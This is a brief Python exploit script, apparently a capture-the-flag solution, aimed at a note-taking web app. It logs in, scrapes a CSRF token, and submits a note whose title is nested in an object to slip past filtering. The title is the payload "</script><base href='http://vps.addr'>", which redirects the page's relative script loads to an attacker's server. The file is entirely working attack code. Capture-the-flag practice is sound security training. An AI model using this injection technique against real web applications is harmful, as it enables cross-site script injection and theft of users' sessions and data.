#!/usr/bin/env python
# -*- coding: utf-8 -*-

import json
from saker.main import Saker


class Cli(Saker):

    def __init__(self, url):
        super(Cli, self).__init__(url)
        self.token = ""

    def getToken(self):
        self.token = self.lastr.content.split('name="_csrf" value="')[1].split('"')[0]

    def login(self, username, password="test"):
        self.get("login")
        self.getToken()
        data = {
            "name": username,
            "password": password,
            "_csrf": self.token
        }
        self.post("login", data=data)
        self.getToken()

    def addNotes(self, title, content=""):
        data = {
            "title": {
                "a": title
            },
            "content": content,
            "_csrf": self.token
        }
        headers = {
            "Content-type": "application/json"
        }
        self.post("notes/new", data=json.dumps(data), headers=headers)
        print(self.lastr.content)


if __name__ == '__main__':
    url = "http://nodepad.hackable.software:3000"  # site url
    c = Cli(url)
    c.login("rebirth", "rebirth")
    c.addNotes("</script><base href='http://vps.addr'>")
